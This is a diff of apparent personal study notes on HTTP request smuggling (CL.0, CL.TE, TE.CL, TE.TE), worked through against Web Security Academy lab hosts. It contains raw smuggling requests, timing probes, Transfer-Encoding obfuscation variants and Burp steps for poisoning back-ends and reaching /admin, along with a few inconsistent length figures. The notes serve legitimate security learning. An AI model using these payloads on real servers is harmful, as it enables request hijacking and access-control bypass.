@@ -35,6 +35,12 @@ The specification attempts to prevent the problem of conflict by stating if both
 
 - Some servers don't support Transfer-Encoding in requests
 - Some servers that do support Transfer-Encoding can be induced not to process it if the header is obfuscated
+
+Classic request smuggling attacks involve placing both the CL and TE header into a single HTTP/1 request and manipulating them so the front-end and back-end process the request differently. There are different behaviours:
+
+- CL.TE - front-end uses CL header and back-end uses TE header.
+- TE.CL - front-end uses TE header and back-end uses CL header.
+- TE.TE - front-end and back-end support TE header, but one can be induced not to process it by obfuscating the header in some way.
 # Important Notes
 
 These techniques are only possible using HTTP/1 request. Browsers and other clients, including Burp, use HTTP/2 by default to communicate with servers that explicitly advertise support for it via ALPN as part of the TLS handshake. As a result, when testing sites with HTTP/2 support, you need to manually switch protocols in Repeater.
@@ -1540,3 +1546,540 @@ To exploit it, modify the path to an invalid path so that when you send the requ
 
 ![[Admin Token.png]]
 # CL.0 Request Smuggling
+
+In some instances, servers can be told to ignore the CL header, meaning they assume that each request finishes at the end of the headers - effectively the same as treating the CL as 0. If the back-end exhibits the behaviour, but the front-end still uses the CL header to determine where the request ends, it can be exploited.
+
+To probe, try sending a request containing another partial request in its body, then send a normal request. Check to see whether the response was affected by the smuggled prefix. For example, a normal request for the home page may return a 404 suggesting the back-end interpreted the body of the POST request as the start of another:
+
+```http
+POST /vulnerable-endpoint HTTP/1.1 Host: vulnerable-website.com Connection: keep-alive Content-Type: application/x-www-form-urlencoded Content-Length: 34 GET /hopefully404 HTTP/1.1 Foo: xGET / HTTP/1.1 Host: vulnerable-website.com
+```
+
+```http
+HTTP/1.1 200 OK HTTP/1.1 404 Not Found
+```
+
+The length of the request is specified by a normal, accurate CL header. To perform this:
+
+1. Create one tab containing the setup request and another containing an arbitrary normal request.
+2. Add the two tabs to a group in order.
+3. Change mode to "Send group in sequence (single connection)".
+4. Send the sequence and check the responses.
+
+If no endpoints are vulnerable, try eliciting different behaviour. When a request headers trigger a server error, some servers issue a response without consuming the request body off the socket. If they do not close the connection after, it can provide an alternative CL.0 desync vector.
+
+Also try using GET requests with an obfuscated CL header. If you can hide it from the back-end but not the front-end, it can also desync. 
+# Exploiting CL.0 Request Smuggling
+
+To exploit, you must find an endpoint that ignores the Content-Length - three methods to do this:
+
+1. POST request to a static file
+2. POST request to a server level redirect
+3. POST request that triggers a server side error
+
+If you want to apply it through the browser, make sure that the request settings are modified so you can send the attack requests and normal requests over the same TCP connection by setting the header `Connection: keep-alive` and also enable `HTTP/1 Connection Re-use in Burp`.
+
+Finally, add the attacker and normal request to the same group in Repeater and send them in sequence over a single TCP connection.
+
+For example, grab a request for a static resource and send it to Repeater. Then, downgrade to HTTP/1.1, change it to a POST request, show new line characters, delete unnecessary headers, turn off automatic content-length so we can set it manually to smuggle requests past it.
+
+Use differential responses to confirm the vulnerability by crafting a request such as:
+
+```http
+POST /resources/images/blog.svg HTTP/1.1
+Host: 0a3000cc0426fa6a850421010087000f.web-security-academy.net
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 0
+
+GET /hfsdafasfas HTTP/1.1
+X-Ignore: X
+```
+
+You must also ensure the same TCP connection is being used for both requests (attacker and normal) so add a Connection header:
+
+```http
+POST /resources/images/blog.svg HTTP/1.1
+Host: 0a3000cc0426fa6a850421010087000f.web-security-academy.net
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 0
+Connection: keep-alive
+
+GET /hfsdafasfas HTTP/1.1
+X-Ignore: X
+```
+
+Make sure it allows connection re-use in settings and send them as a group as a single connection. If a 404 returns for the SVG file, it differs from the normal confirming the CL.0 vulnerability.
+
+To exploit it, try bypassing client side security controls by setting the GET path to `/admin` and send it over the same connection again - it may bypass the controls.
+# CL.TE Vulnerabilities
+
+In CL.TE, the front-end uses CL header and the back-end uses TE headers. A single HTTP request smuggling attack can be done via:
+
+```http
+POST / HTTP/1.1
+Host: vulnerable-website.com
+Content-Length: 13
+Transfer-Encoding: chunked
+
+0
+
+SMUGGLED
+```
+
+The front-end processes the CL header and determines the request body is 13 bytes, up to the end of `SMUGGLED` and forwards it to the back-end. The back-end server processes the TE header and treats the message body as using chunked encoding. It processes the first chunk, stated to be 0 length, and is treated as terminating the request.
+
+The following bytes are left unprocessed and the back-end treats them as being the start of the next request in the sequence.
+# Exploiting CL.TE Request Smuggling
+
+The first step is finding an endpoint such as the home page. Once identified, there are a few steps:
+
+1. Downgrading the HTTP/1.1 protocol
+2. Changing the request method to POST
+3. Disabling automatic CL updates
+4. Showing non-printable characters
+
+After setting them, send a request to make sure it works.
+
+To detect if the front-end is using Content-Length and the back-end is using Transfer-Encoding, only one payload is needed:
+
+```http
+Content-Length: 6
+Transfer-Encoding: chunked
+\r\n
+3\r\n
+abc\r\n
+X\r\n
+```
+
+It uses a timing technique where the response to the request tells you what the front-end and back-end are using.
+
+![[CL Detection.png]]
+
+Modify the POST request by adding the TE header, indicating 3 bytes are coming next, followed by 3 bytes and then followed by `X`. The Content-Length is also set to 6 to indicate to the front-end (if using CL) that the content ends after `abc`:
+
+```http
+POST / HTTP/1.1
+Host: 0ae600470307d0528439228d009d0001.web-security-academy.net
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 0
+Transfer-Encoding: chunked
+
+3
+abc
+X
+
+```
+
+A timeout occurs because the front-end drops the `X` from the request before forwarding it to the back-end. When the back-end receives it, it looks for the next chunk size where the X used to be, but since it is missing, it keeps the connection open waiting for the chunk size. When it does not arrive, it times out.
+
+![[CLTE Detection.png]]
+
+This means you can send an ambiguous request that the front-end and back-end server treat differently. To confirm the vulnerability, the following can be used:
+
+```http
+Content-Length: 6
+Transfer-Encoding: chunked
+\r\n
+0\r\n
+\r\n
+X
+```
+
+![[Confirm.png]]
+
+This payload is part of an attack request, where the front-end server should process the entire attack request based on the CL and the back-end should process only part of the attack request by sending an early terminating chunk to indicate the end of the chunked message (`0\r\n`) so the back-end is poisoned with what comes after the terminating chunk.
+
+![[Attack Path.png]]
+
+Typically, follow up the attack request with a normal request that is appended to the prefix previously poisoned. 
+
+>[!info]
+>The normal request should be as similiar as possible to the attack request as in a real scenario, you want to increase the odds that it is sent to the same backend server.
+
+To make it similar, change it to HTTP/1.1, change it to POST and remove the same headers as the attack request. In the body, add a random request and send it to make sure it works:
+
+```http
+POST / HTTP/1.1
+Host: 0ae600470307d0528439228d009d0001.web-security-academy.net
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 7
+
+foo=bar
+```
+
+In the attack request, modify the request body to indicate to the back-end that the chunked message has ended via a terminating chunk and then poison the backend with a prefix such as `G`. 
+
+>[!info]
+>Think about the front-end server - it should forward the entire request body to the back end server so the Content-Length should match the actual bytes (i.e. `6`).
+
+```http
+POST / HTTP/1.1
+Host: 0ae600470307d0528439228d009d0001.web-security-academy.net
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 6
+Transfer-Encoding: chunked
+
+0
+
+G
+```
+
+After sending the attack and normal request, it should return an unrecognized method of `GPOST` due to the poisoning.
+
+![[GPOST.png]]
+# TE.CL Vulnerabilities
+
+In TE.CL, the front-end uses the TE header and the back-end uses the CL header. To perform a simple HTTP request smuggling attack:
+
+```http
+POST / HTTP/1.1
+Host: vulnerable-website.com
+Content-Length: 3
+Transfer-Encoding: chunked
+
+8
+SMUGGLED
+0
+```
+
+The front-end processes the TE header and treats the message body as using chunked encoding. It processes the first chunk, which is stated to be 8 bytes long, up to the start of the line following `SMUGGLED`. It processes the second chunk, which is stated to be 0, and is treated as a terminating chunk and forwards to the back-end.
+
+The back-end processes the CL header and determines that the request body is 3 bytes long, up to the start of the line following `8`. The following bytes are left unprocessed and the back-end treats them as being the start of the next request in the sequence.
+# Exploiting TE.CL Request Smuggling
+
+To exploit, you first find an endpoint such as the home page. Once found, do some things:
+
+1. Downgrading the HTTP/1.1 protocol
+2. Changing the request method to POST
+3. Disabling automatic CL updates
+4. Showing non-printable characters
+
+>[!info]
+>The method HTTP/2 uses to determine Content-Length is different from HTTP/1.1 and HTTP/2 does not work with these techniques.
+
+Make sure the request works as normal. 
+
+To detect the TE.CL vulnerability, it's best to use timing techniques. 
+
+![[Detection2.png]]
+
+For example, try using the following first payload:
+
+```http
+Content-Length: 6
+Transfer-Encoding: chunked\r\n
+\r\n
+3\r\n
+abc\r\n
+X\r\n
+
+```
+
+The CL makes sure it ends after the `abc`. After sending it, it may return an invalid request. If a 400 is returned (rejected), it is because once the front-end receives the request and uses TE, it reads the first chunk size as 3 bytes (abc) and for the next chunk size, it expects a hex number, but reads `X` which is invalid and gets rejected, indicating the front-end is using TE.
+
+To figure out the back-end, modify the request to indicate that the chunked message has ended and terminate it with an X without a new line after:
+
+```http
+Content-Length: 6
+Transfer-Encoding: chunked\r\n
+\r\n
+0\r\n
+\r\n
+X
+```
+
+If it times out, it indicates that the back-end is using CL. When forwarding the request to the front-end (using TE), it thinks the request body is ending after it reads in the `0\r\n\r\n` as it indicates the end of a chunked message.
+
+It chops off the `X` and forwards it to the back-end. The back-end, using CL, it expects 6 bytes, but only 5 are received and it waits for the 6th and eventually times out.
+
+To confirm the vulnerability, use a pair of requests by creating an attacker request to interfere with the processing of the next request as it can poison the backend server with a prefix as well as a normal request.
+
+>[!info]
+>The normal request should be as similiar as possible to the attack request as in a real scenario, you want to increase the odds that it is sent to the same backend server.
+
+Modify the attacker request by indicating the chunk size is 1, followed by G, followed by the end of the chunked message via a terminating chunk - make sure the content length is updated to `3` to indicate that the message ends after the `1\r\n` so the back-end is poisoned with the leftovers:
+
+```http
+POST / HTTP/1.1
+Host: 0ac700d404e6835e81855c1c00af00e6.web-security-academy.net
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 11
+Transfer-Encoding: chunked
+
+1
+g
+0
+
+
+```
+
+After sending it and a normal request, it returns an error stating an unrecognized GPOST method:
+
+![[G0POST.png]]
+
+When sending the attack request, the front-end uses TE chunked and looks for the `0\r\n\r\n` and forwards the entire request body on to the back-end. The back-end uses CL of 3 so it assumes the request body ends after the `1\r\n\r\n` which means it gets poisoned by the G0 and two CRLFs that are left on the back-end server.
+
+When sending the normal request, the normal request is appended to the prefix from the previous attack request which contains `G0`:
+
+![[G0POST Method.png]]
+
+In the attack request, modify the payload to poison the back-end server with a GPOST request by adding another POST request below, changing the request method to GPOST and removing the Host header:
+
+```http
+POST / HTTP/1.1
+Host: 0ac700d404e6835e81855c1c00af00e6.web-security-academy.net
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 3
+Transfer-Encoding: chunked
+
+GPOST / HTTP/1.1
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 3
+
+```
+
+To add the body, indicate the chunked message has ended via the terminating chunk of `0\r\n\r\n`. The CL and chunk size need to be fixed:
+
+```http
+POST / HTTP/1.1
+Host: 0ac700d404e6835e81855c1c00af00e6.web-security-academy.net
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 3
+Transfer-Encoding: chunked
+
+GPOST / HTTP/1.1
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 3
+
+0
+
+
+```
+
+To fix it, the CL of the smuggled body is 5 bytes. To figure out the length of the chunk, select everything from GPOST to the end of the headers (don't include the CRLF before the 0) and see what the hex size is (0x56).
+
+```http
+POST / HTTP/1.1
+Host: 0ac700d404e6835e81855c1c00af00e6.web-security-academy.net
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 3
+Transfer-Encoding: chunked
+
+56
+GPOST / HTTP/1.1
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 3
+
+0
+
+
+```
+
+The CL must be fixed of the actual request. The back-end server should think that the request, using CL, is ended after the `56\r\n` line so the GPOST is smuggled. To do that, the CL should be 4 bytes (`56\r\n`).
+
+```http
+POST / HTTP/1.1
+Host: 0ac700d404e6835e81855c1c00af00e6.web-security-academy.net
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 4
+Transfer-Encoding: chunked
+
+56
+GPOST / HTTP/1.1
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 3
+
+0
+
+
+```
+
+After sending both requests, a 200 OK request may be returned because the CL was set to 5 bytes which was just the value of the smuggled request body. The minimum value it should be set to is 5 plus one (minimum 6) to include the `G` at the start of the next request.
+
+![[GPOST Works.png]]
+
+>[!info]
+>If the extra byte is not defined, when the attack request is sent and has been poisoned with the prefix, when the normal request is sent, it won't be appended to the prefix. Changing it to six, at least one byte of the normal request will be added to the prefix poisoned previously.
+
+The maximum length of the Content-Length you can set in the GPOST request is the CL of the smuggled request body, plus the total CL of the normal request so 5 plus 159 = 164. If the value is more than the total length, it will time out due to the back-end server expecting more bytes that do not exist.
+# TE.TE Vulnerabilities
+
+In TE.TE, the front-end and back-end both support TE header, but one can be induced not to process it by obfuscating the header. There are endless ways to obfuscate but some include:
+
+```http
+Transfer-Encoding: xchunked
+
+Transfer-Encoding : chunked
+
+Transfer-Encoding: chunked
+Transfer-Encoding: x
+
+Transfer-Encoding:[tab]chunked
+
+[space]Transfer-Encoding: chunked
+
+X: X[\n]Transfer-Encoding: chunked
+
+Transfer-Encoding
+: chunked
+```
+
+Each one involves a subtle departure from the specification. It is common for different implementations to tolerate different variations from the specification. To uncover a TE.TE vulnerability, find some variation of the TE header such that only one of the front-end or back-end servers process it, while the other server ignores it.
+
+Depending on whether it is the front-end or the back-end server that can be induced not to process the obfuscated Transfer-Encoding header, the remainder of the attack will take the same form as for the CL.TE or TE.CL vulnerabilities.
+# Exploiting TE.TE Vulnerabilities
+
+To start, find an endpoint such as the home page and do some modifications such as:
+
+1. Downgrading the HTTP/1.1 protocol
+2. Changing the request method to POST
+3. Disabling automatic CL updates
+4. Showing non-printable characters
+
+After preparation, detect the vulnerability via timing techniques. Try to detect what the front-end uses via the following:
+
+![[Detection2.png]]
+
+For example, try using the following first payload:
+
+```http
+Content-Length: 6
+Transfer-Encoding: chunked\r\n
+\r\n
+3\r\n
+abc\r\n
+X\r\n
+
+```
+
+Change the CL to 6 to make sure the content ends after `abc`, not including the new line. After sending it, it may return an invalid request, meaning the front-end server rejects the request which indicates it is using TE chunked since X is an incorrect value for the next chunk size - it expects a hex number:
+
+```http
+POST / HTTP/1.1
+Host: 0a7e00f204b1fcfae1bc6a7a00bb006e.web-security-academy.net
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 6
+Transfer-Encoding: chunked
+
+3
+abc
+X
+```
+
+To find out the back-end, modify the request to indicate the chunked message has ended by sending the terminating chunk and then sending an X with no CRLF:
+
+```http
+POST / HTTP/1.1
+Host: 0a7e00f204b1fcfae1bc6a7a00bb006e.web-security-academy.net
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 6
+Transfer-Encoding: chunked
+
+0
+
+X
+```
+
+If a 200 is returned, it confirms that the back-end server uses TE as well:
+
+![[ETE.png]]
+
+To perform a desync, one server must be tricked to not process the TE header. Many techniques are available including:
+
+![[TE Obfuscation.png]]
+
+The idea is that the front-end and back-end treat it differently and one server will decide to process the content length instead. To perform it, try adding a second header with an invalid value such as `x`:
+
+```http
+POST / HTTP/1.1
+Host: 0a7e00f204b1fcfae1bc6a7a00bb006e.web-security-academy.net
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 6
+Transfer-Encoding: chunked
+Transfer-Encoding: x
+
+0
+
+X
+```
+
+If the response times out, it is because the front-end server is more lenient and accepts the malformed TE header and processes the junk body, while the back-end is more strict and rejects the TE header and processes the CL header instead:
+
+![[TECL.png]]
+
+>[!info]
+>The difference could be a different in engines such as Nginx and Caddy or running different versions that deal with it differently.
+
+To exploit it, smuggle a prefix using differential responses with a pair of requests with the first used to smuggle a prefix to poison the back-end and followed up with a normal request that is appended to the prefix:
+
+![[GPOST Poison.png]]
+
+Modify the attacker request by sending a chunk size of 1, followed by G, followed by 0 and two CRLFs as well as changing the content length to 3:
+
+```http
+POST / HTTP/1.1
+Host: 0a7e00f204b1fcfae1bc6a7a00bb006e.web-security-academy.net
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 3
+Transfer-Encoding: chunked
+Transfer-Encoding: x
+
+1
+G
+0
+
+
+```
+
+After sending it, the back-end server is poisoned because the chunk size was 1, it thinks the message ends after the `1\r\n` and gets poisoned by the G and two CRLF:
+
+![[G0POST U.png]]
+
+To turn G0POST into GPOST, a new GPOST request should be made:
+
+![[New GPOST.png]]
+
+To do it, modify the attacker request to the following by removing the previous payload and copying the POST request and changing to a GPOST, removing the Host header. After the smuggled headers, make sure a CRLF is present and then in the body, add the parameter `x=` followed by a CRLF. Then, indicate the end of the chunk message to the front-end server to make sure it forwards the entire request body onto the back-end:
+
+```http
+POST / HTTP/1.1
+Host: 0a7e00f204b1fcfae1bc6a7a00bb006e.web-security-academy.net
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 3
+Transfer-Encoding: chunked
+Transfer-Encoding: x
+
+GPOST / HTTP/1.1
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 3
+
+x=1
+0
+
+
+```
+
+The Content-Length and chunk sizes must be changed. For the CL in the GPOST, the minimum value should be 10 plus one (11) - length of actual smuggled request body plus one. To fix the chunk size before GPOST, select everything from `GPOST` to `x=1`, missing the CRLF to get the hex value of 5c.
+
+Finally, the CL should be changed at the top to indicate to the back-end server using CL that the request ends after `5c` which is 4 bytes:
+
+```http
+POST / HTTP/1.1
+Host: 0a7e00f204b1fcfae1bc6a7a00bb006e.web-security-academy.net
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 4
+Transfer-Encoding: chunked
+Transfer-Encoding: x
+
+5c
+GPOST / HTTP/1.1
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 11
+
+x=1
+0
+
+
+```
+
+After, send the attacker and normal request.
